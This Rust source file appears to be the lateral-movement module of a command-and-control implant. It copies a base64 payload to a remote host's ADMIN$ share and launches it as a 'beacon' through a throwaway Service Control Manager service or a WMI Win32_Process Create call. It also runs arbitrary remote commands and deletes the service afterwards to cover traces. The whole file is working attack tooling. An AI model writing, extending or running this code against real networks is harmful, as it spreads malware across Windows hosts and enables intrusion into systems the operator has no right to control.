//! Lateral movement — jump (psexec / wmi) and remote-exec.
//!
//! All Win32 / COM calls are behind `#[cfg(target_os = "windows")]`.
//! Non-Windows builds get stubs that return an error string.
//!
//! Uses manual `extern "system"` FFI declarations linked to system DLLs
//! (advapi32, ole32, oleaut32) so the module is self-contained.

// ─── Windows implementation ───────────────────────────────────────────

#[cfg(target_os = "windows")]
mod win {
    use anyhow::{anyhow, Result};
    use base64::{engine::general_purpose::STANDARD, Engine};
    use rand::Rng;
    use std::ffi::c_void;
    use std::ptr::{null, null_mut};

    // ── FFI declarations ─────────────────────────────────────

    #[link(name = "kernel32")]
    unsafe extern "system" {
        fn GetLastError() -> u32;
    }

    #[link(name = "advapi32")]
    unsafe extern "system" {
        fn OpenSCManagerW(
            lpMachineName: *const u16,
            lpDatabaseName: *const u16,
            dwDesiredAccess: u32,
        ) -> isize;

        fn CreateServiceW(
            hSCManager: isize,
            lpServiceName: *const u16,
            lpDisplayName: *const u16,
            dwDesiredAccess: u32,
            dwServiceType: u32,
            dwStartType: u32,
            dwErrorControl: u32,
            lpBinaryPathName: *const u16,
            lpLoadOrderGroup: *const u16,
            lpdwTagId: *mut u32,
            lpDependencies: *const u16,
            lpServiceStartName: *const u16,
            lpPassword: *const u16,
        ) -> isize;

        fn StartServiceW(
            hService: isize,
            dwNumServiceArgs: u32,
            lpServiceArgVectors: *const *const u16,
        ) -> i32;

        fn DeleteService(hService: isize) -> i32;

        fn CloseServiceHandle(hSCObject: isize) -> i32;
    }

    #[link(name = "ole32")]
    unsafe extern "system" {
        fn CoInitializeEx(pvReserved: *const c_void, dwCoInit: u32) -> i32;

        fn CoCreateInstance(
            rclsid: *const Guid,
            pUnkOuter: *mut c_void,
            dwClsContext: u32,
            riid: *const Guid,
            ppv: *mut *mut c_void,
        ) -> i32;

        fn CoSetProxyBlanket(
            pProxy: *mut c_void,
            dwAuthnSvc: u32,
            dwAuthzSvc: u32,
            pServerPrincName: *const u16,
            dwAuthnLevel: u32,
            dwImpLevel: u32,
            pAuthInfo: *const c_void,
            dwCapabilities: u32,
        ) -> i32;

        fn CoUninitialize();
    }

    #[link(name = "oleaut32")]
    unsafe extern "system" {
        fn SysAllocString(psz: *const u16) -> *mut u16;
        fn SysFreeString(bstrString: *mut u16);
    }

    // ── Constants ────────────────────────────────────────────

    // SCM access
    const SC_MANAGER_CONNECT: u32 = 0x0001;
    const SC_MANAGER_CREATE_SERVICE: u32 = 0x0002;
    const SERVICE_START: u32 = 0x0010;
    const DELETE: u32 = 0x0001_0000;
    const SERVICE_WIN32_OWN_PROCESS: u32 = 0x10;
    const SERVICE_DEMAND_START: u32 = 0x03;
    const SERVICE_ERROR_IGNORE: u32 = 0x00;

    // COM
    const COINIT_MULTITHREADED: u32 = 0;
    const CLSCTX_INPROC_SERVER: u32 = 1;

    // VARIANT
    const VT_BSTR: u16 = 8;

    // RPC authentication
    const RPC_C_AUTHN_WINNT: u32 = 10;
    const RPC_C_AUTHZ_NONE: u32 = 0;
    const RPC_C_AUTHN_LEVEL_CALL: u32 = 3;
    const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
    const EOAC_NONE: u32 = 0;

    // ── Types ────────────────────────────────────────────────

    #[repr(C)]
    struct Guid {
        data1: u32,
        data2: u16,
        data3: u16,
        data4: [u8; 8],
    }

    // CLSID_WbemLocator {4590f811-1d3a-11d0-891f-00aa004b2e24}
    static CLSID_WBEM_LOCATOR: Guid = Guid {
        data1: 0x4590f811,
        data2: 0x1d3a,
        data3: 0x11d0,
        data4: [0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24],
    };

    // IID_IWbemLocator {dc12a687-737f-11cf-884d-00aa004b2e24}
    static IID_IWBEM_LOCATOR: Guid = Guid {
        data1: 0xdc12a687,
        data2: 0x737f,
        data3: 0x11cf,
        data4: [0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24],
    };

    /// VARIANT — 8-byte header + pointer-sized union data.
    /// Total: 16 bytes on x86, 24 bytes on x64.
    #[repr(C)]
    struct Variant {
        vt: u16,
        _pad: [u16; 3],
        data: [usize; 2],
    }

    // ── Helpers ──────────────────────────────────────────────

    fn wide(s: &str) -> Vec<u16> {
        s.encode_utf16().chain(std::iter::once(0)).collect()
    }

    fn alloc_bstr(s: &str) -> *mut u16 {
        let w = wide(s);
        unsafe { SysAllocString(w.as_ptr()) }
    }

    fn free_bstr(b: *mut u16) {
        if !b.is_null() {
            unsafe { SysFreeString(b) };
        }
    }

    /// IUnknown::Release (vtable index 2).
    fn com_release(obj: *mut c_void) {
        if obj.is_null() {
            return;
        }
        unsafe {
            let vtbl = *(obj as *const *const usize);
            let release: unsafe extern "system" fn(*mut c_void) -> u32 =
                std::mem::transmute(*vtbl.add(2));
            release(obj);
        }
    }

    /// Read a function pointer from a COM vtable by index.
    ///
    /// # Safety
    /// `obj` must be a valid COM interface pointer and `idx` a correct vtable slot.
    unsafe fn vtable_fn(obj: *mut c_void, idx: usize) -> usize {
        let vtbl = *(obj as *const *const usize);
        *vtbl.add(idx)
    }

    fn random_name() -> String {
        let n: u32 = rand::rng().random_range(10000..99999);
        format!("ccat{}", n)
    }

    fn win32_err(ctx: &str) -> String {
        format!("{}: error {}", ctx, unsafe { GetLastError() })
    }

    /// RAII guard — calls CoUninitialize on drop.
    struct ComGuard;
    impl Drop for ComGuard {
        fn drop(&mut self) {
            unsafe { CoUninitialize() };
        }
    }

    // ── File deployment via UNC (uses current token context) ─

    fn deploy_payload(target: &str, name: &str, payload: &[u8]) -> Result<()> {
        let unc = format!("\\\\{}\\ADMIN$\\{}.exe", target, name);
        std::fs::write(&unc, payload).map_err(|e| anyhow!("deploy to {}: {}", unc, e))
    }

    fn remove_payload(target: &str, name: &str) {
        let unc = format!("\\\\{}\\ADMIN$\\{}.exe", target, name);
        let _ = std::fs::remove_file(&unc);
    }

    // ── SCM (Service Control Manager) ────────────────────────

    fn scm_exec(target: &str, svc_name: &str, bin_path: &str) -> Result<String> {
        let target_w = wide(&format!("\\\\{}", target));
        let svc_w = wide(svc_name);
        let bin_w = wide(bin_path);

        unsafe {
            let scm = OpenSCManagerW(
                target_w.as_ptr(),
                null(),
                SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE,
            );
            if scm == 0 {
                return Err(anyhow!(win32_err("OpenSCManagerW")));
            }

            let svc = CreateServiceW(
                scm,
                svc_w.as_ptr(),
                svc_w.as_ptr(), // display name = service name
                SERVICE_START | DELETE,
                SERVICE_WIN32_OWN_PROCESS,
                SERVICE_DEMAND_START,
                SERVICE_ERROR_IGNORE,
                bin_w.as_ptr(),
                null(),     // load order group
                null_mut(), // tag id
                null(),     // dependencies
                null(),     // account (LocalSystem)
                null(),     // password
            );
            if svc == 0 {
                let err = win32_err("CreateServiceW");
                CloseServiceHandle(scm);
                return Err(anyhow!(err));
            }

            // StartServiceW may "fail" for non-service binaries (cmd.exe /c ...)
            // because they never call StartServiceCtrlDispatcher, but the process
            // still executes.
            let ok = StartServiceW(svc, 0, null());
            let msg = if ok != 0 {
                "service started".to_string()
            } else {
                format!(
                    "StartServiceW error {} (process may still have executed)",
                    GetLastError()
                )
            };

            // Cleanup: delete service entry (process keeps running).
            DeleteService(svc);
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);

            Ok(msg)
        }
    }

    // ── WMI (COM) via manual vtable calls ────────────────────
    //
    // Vtable indices (IUnknown occupies slots 0-2):
    //   IWbemLocator::ConnectServer  = 3
    //   IWbemServices::GetObject     = 6
    //   IWbemServices::ExecMethod    = 24
    //   IWbemClassObject::Put        = 5
    //   IWbemClassObject::SpawnInstance = 15
    //   IWbemClassObject::GetMethod  = 19

    fn wmi_exec(target: &str, command_line: &str) -> Result<String> {
        // COM method function-pointer type aliases.
        type ConnectServerFn = unsafe extern "system" fn(
            *mut c_void,
            *mut u16,
            *mut u16,
            *mut u16,
            *mut u16,
            i32,
            *mut u16,
            *mut c_void,
            *mut *mut c_void,
        ) -> i32;
        type GetObjectFn = unsafe extern "system" fn(
            *mut c_void,
            *mut u16,
            i32,
            *mut c_void,
            *mut *mut c_void,
            *mut *mut c_void,
        ) -> i32;
        type GetMethodFn = unsafe extern "system" fn(
            *mut c_void,
            *const u16,
            i32,
            *mut *mut c_void,
            *mut *mut c_void,
        ) -> i32;
        type SpawnInstanceFn =
            unsafe extern "system" fn(*mut c_void, i32, *mut *mut c_void) -> i32;
        type PutFn = unsafe extern "system" fn(
            *mut c_void,
            *const u16,
            i32,
            *mut c_void,
            i32,
        ) -> i32;
        type ExecMethodFn = unsafe extern "system" fn(
            *mut c_void,
            *mut u16,
            *mut u16,
            i32,
            *mut c_void,
            *mut c_void,
            *mut *mut c_void,
            *mut *mut c_void,
        ) -> i32;

        unsafe {
            // 1. Initialize COM (multithreaded apartment).
            let hr = CoInitializeEx(null(), COINIT_MULTITHREADED);
            if hr < 0 {
                return Err(anyhow!("CoInitializeEx: 0x{:08X}", hr as u32));
            }
            let _guard = ComGuard;

            // 2. CoCreateInstance(CLSID_WbemLocator) → IWbemLocator*
            let mut locator: *mut c_void = null_mut();
            let hr = CoCreateInstance(
                &CLSID_WBEM_LOCATOR,
                null_mut(),
                CLSCTX_INPROC_SERVER,
                &IID_IWBEM_LOCATOR,
                &mut locator,
            );
            if hr < 0 {
                return Err(anyhow!(
                    "CoCreateInstance(WbemLocator): 0x{:08X}",
                    hr as u32
                ));
            }

            // 3. IWbemLocator::ConnectServer → IWbemServices* (vtable 3)
            let resource = alloc_bstr(&format!("\\\\{}\\root\\cimv2", target));
            let mut services: *mut c_void = null_mut();
            let connect: ConnectServerFn = std::mem::transmute(vtable_fn(locator, 3));
            let hr = connect(
                locator,
                resource,
                null_mut(),
                null_mut(),
                null_mut(),
                0,
                null_mut(),
                null_mut(),
                &mut services,
            );
            free_bstr(resource);
            if hr < 0 {
                com_release(locator);
                return Err(anyhow!("ConnectServer: 0x{:08X}", hr as u32));
            }

            // 4. Set proxy blanket so current token is used for remote auth.
            CoSetProxyBlanket(
                services,
                RPC_C_AUTHN_WINNT,
                RPC_C_AUTHZ_NONE,
                null(),
                RPC_C_AUTHN_LEVEL_CALL,
                RPC_C_IMP_LEVEL_IMPERSONATE,
                null(),
                EOAC_NONE,
            );

            // 5. GetObject("Win32_Process") (vtable 6)
            let class_bstr = alloc_bstr("Win32_Process");
            let mut class_obj: *mut c_void = null_mut();
            let get_obj: GetObjectFn = std::mem::transmute(vtable_fn(services, 6));
            let hr = get_obj(
                services,
                class_bstr,
                0,
                null_mut(),
                &mut class_obj,
                null_mut(),
            );
            free_bstr(class_bstr);
            if hr < 0 {
                com_release(services);
                com_release(locator);
                return Err(anyhow!("GetObject(Win32_Process): 0x{:08X}", hr as u32));
            }

            // 6. GetMethod("Create") → input-params definition (vtable 19)
            let method_w = wide("Create");
            let mut in_def: *mut c_void = null_mut();
            let get_method: GetMethodFn = std::mem::transmute(vtable_fn(class_obj, 19));
            let hr = get_method(class_obj, method_w.as_ptr(), 0, &mut in_def, null_mut());
            if hr < 0 {
                com_release(class_obj);
                com_release(services);
                com_release(locator);
                return Err(anyhow!("GetMethod(Create): 0x{:08X}", hr as u32));
            }

            // 7. SpawnInstance → concrete input params (vtable 15)
            let mut in_params: *mut c_void = null_mut();
            let spawn: SpawnInstanceFn = std::mem::transmute(vtable_fn(in_def, 15));
            let hr = spawn(in_def, 0, &mut in_params);
            if hr < 0 {
                com_release(in_def);
                com_release(class_obj);
                com_release(services);
                com_release(locator);
                return Err(anyhow!("SpawnInstance: 0x{:08X}", hr as u32));
            }

            // 8. Put("CommandLine", VT_BSTR variant) (vtable 5)
            let prop_w = wide("CommandLine");
            let cmd_bstr = alloc_bstr(command_line);
            let mut var = Variant {
                vt: VT_BSTR,
                _pad: [0; 3],
                data: [cmd_bstr as usize, 0],
            };
            let put: PutFn = std::mem::transmute(vtable_fn(in_params, 5));
            let hr = put(
                in_params,
                prop_w.as_ptr(),
                0,
                &mut var as *mut _ as *mut c_void,
                0,
            );
            free_bstr(cmd_bstr);
            if hr < 0 {
                com_release(in_params);
                com_release(in_def);
                com_release(class_obj);
                com_release(services);
                com_release(locator);
                return Err(anyhow!("Put(CommandLine): 0x{:08X}", hr as u32));
            }

            // 9. ExecMethod("Win32_Process", "Create") (vtable 24)
            let obj_bstr = alloc_bstr("Win32_Process");
            let meth_bstr = alloc_bstr("Create");
            let mut out_params: *mut c_void = null_mut();
            let exec: ExecMethodFn = std::mem::transmute(vtable_fn(services, 24));
            let hr = exec(
                services,
                obj_bstr,
                meth_bstr,
                0,
                null_mut(),
                in_params,
                &mut out_params,
                null_mut(),
            );
            free_bstr(obj_bstr);
            free_bstr(meth_bstr);

            // Cleanup COM objects (reverse order).
            com_release(out_params);
            com_release(in_params);
            com_release(in_def);
            com_release(class_obj);
            com_release(services);
            com_release(locator);

            if hr < 0 {
                return Err(anyhow!("ExecMethod(Create): 0x{:08X}", hr as u32));
            }
            Ok("WMI process created".to_string())
        }
    }

    // ── Public API ───────────────────────────────────────────

    pub fn jump_psexec(target: &str, payload_b64: &str) -> Result<(i32, String, String)> {
        let payload = STANDARD
            .decode(payload_b64)
            .map_err(|e| anyhow!("payload decode: {}", e))?;
        let name = random_name();
        deploy_payload(target, &name, &payload)?;

        // Use `cmd /c start /b` so the beacon process outlives the service.
        let bin_path = format!("cmd.exe /c start /b C:\\Windows\\{}.exe", name);
        match scm_exec(target, &name, &bin_path) {
            Ok(msg) => Ok((
                0,
                format!("[*] jump psexec -> {}: {}", target, msg),
                String::new(),
            )),
            Err(e) => {
                remove_payload(target, &name);
                Ok((1, String::new(), format!("psexec: {}", e)))
            }
        }
    }

    pub fn jump_wmi(target: &str, payload_b64: &str) -> Result<(i32, String, String)> {
        let payload = STANDARD
            .decode(payload_b64)
            .map_err(|e| anyhow!("payload decode: {}", e))?;
        let name = random_name();
        deploy_payload(target, &name, &payload)?;

        let cmd = format!("C:\\Windows\\{}.exe", name);
        match wmi_exec(target, &cmd) {
            Ok(msg) => Ok((
                0,
                format!("[*] jump wmi -> {}: {}", target, msg),
                String::new(),
            )),
            Err(e) => {
                remove_payload(target, &name);
                Ok((1, String::new(), format!("wmi: {}", e)))
            }
        }
    }

    pub fn remote_exec(
        method: &str,
        target: &str,
        command: &str,
    ) -> Result<(i32, String, String)> {
        match method {
            "psexec" => {
                let svc = random_name();
                let bin = format!("cmd.exe /c {}", command);
                match scm_exec(target, &svc, &bin) {
                    Ok(msg) => Ok((
                        0,
                        format!("[*] remote-exec psexec -> {}: {}", target, msg),
                        String::new(),
                    )),
                    Err(e) => Ok((1, String::new(), format!("remote-exec psexec: {}", e))),
                }
            }
            "wmi" => match wmi_exec(target, command) {
                Ok(msg) => Ok((
                    0,
                    format!("[*] remote-exec wmi -> {}: {}", target, msg),
                    String::new(),
                )),
                Err(e) => Ok((1, String::new(), format!("remote-exec wmi: {}", e))),
            },
            other => Ok((
                1,
                String::new(),
                format!("unknown method: {} (psexec|wmi)", other),
            )),
        }
    }
}

// ─── Non-Windows stubs ────────────────────────────────────────────────

#[cfg(not(target_os = "windows"))]
mod stub {
    use anyhow::Result;

    pub fn jump_psexec(_target: &str, _payload_b64: &str) -> Result<(i32, String, String)> {
        Ok((
            1,
            String::new(),
            "jump psexec requires Windows".to_string(),
        ))
    }

    pub fn jump_wmi(_target: &str, _payload_b64: &str) -> Result<(i32, String, String)> {
        Ok((1, String::new(), "jump wmi requires Windows".to_string()))
    }

    pub fn remote_exec(
        _method: &str,
        _target: &str,
        _command: &str,
    ) -> Result<(i32, String, String)> {
        Ok((
            1,
            String::new(),
            "remote-exec requires Windows".to_string(),
        ))
    }
}

#[cfg(target_os = "windows")]
pub use win::{jump_psexec, jump_wmi, remote_exec};

#[cfg(not(target_os = "windows"))]
pub use stub::{jump_psexec, jump_wmi, remote_exec};
